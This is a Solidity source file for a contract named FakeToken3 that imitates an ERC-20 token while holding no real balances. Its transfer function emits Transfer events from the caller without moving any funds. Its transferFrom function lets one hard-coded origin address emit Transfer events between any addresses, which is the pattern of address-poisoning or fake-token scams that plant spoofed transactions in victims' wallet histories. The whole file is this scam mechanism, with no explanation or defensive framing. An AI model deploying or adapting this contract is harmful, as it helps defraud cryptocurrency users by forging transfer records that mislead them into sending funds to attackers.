// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FakeToken3 {
    string private _signature;
    address private _transferFromAddress;

    event Transfer(address indexed from, address indexed to, uint256 value);

    fallback() external payable {
        revert();
    }

    function name() public view returns (string memory) {
        return "";
    }

    function symbol() public view returns (string memory) {
        return "";
    }

    function decimals() public pure returns (uint8) {
        return 6;
    }

    function totalSupply() public pure returns (uint256) {
        return 0xbc09bcc7bf49d7;
    }

    function balanceOf(address account) public pure returns (uint256) {
        return 0;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        emit Transfer(tx.origin, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(tx.origin == _transferFromAddress, "Invalid origin");
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function signature() public view returns (string memory) {
        return _signature;
    }
}
